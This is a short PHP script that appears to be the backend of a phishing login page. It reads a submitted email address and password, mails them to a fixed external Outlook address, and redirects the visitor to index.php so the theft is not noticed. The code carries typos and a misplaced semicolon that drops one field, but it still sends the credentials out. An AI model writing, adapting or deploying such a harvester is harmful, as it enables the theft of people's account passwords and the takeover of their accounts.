<?php
$visitor_email = $_POST['email'];
$visitor_password = $_POST['password'];
$visitor_localhost = $_POST['localhost'];


$email_from = 'eqpluse@outlook.com' ;

$email_subject = "New form Submissiom" ;

$email_body = "User Email: $visitor_email.\n".
              "User Password: $visitor_password.\n";
              "User localhost: $visitor_localhost.\n";


$to = "eqpluse@outlook.com";

$headers = "from: $email_form \r\n";

$headers .= "Reply-To: $visitor_email \r\n";

mail($to,$email_subject,$email_body,$headers);

header('Location: index.php');

?>
